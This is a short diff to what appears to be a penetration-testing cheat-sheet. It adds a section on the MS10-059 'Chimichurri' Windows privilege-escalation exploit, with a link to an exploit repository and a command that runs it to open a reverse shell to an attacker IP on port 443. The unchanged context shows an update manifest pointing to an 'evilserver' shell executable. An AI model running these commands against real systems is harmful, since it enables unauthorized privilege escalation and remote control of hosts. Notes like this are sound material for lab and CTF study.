@@ -974,3 +974,10 @@ version: 1.2.3
 path: http://evilserver/s'hell.exe
 sha512: <sha512_of_shell_dot_exe>
 ```
+### MS10-059: Vulnerabilities in the Tracing Feature for Services Could Allow Elevation of Privilege (Exploit)
+https://github.com/egre55/windows-kernel-exploits/tree/master/MS10-059:%20Chimichurri
+
+Privesc via reverse shell
+```
+.\Chimichurri.exe 10.10.14.2 443
+```
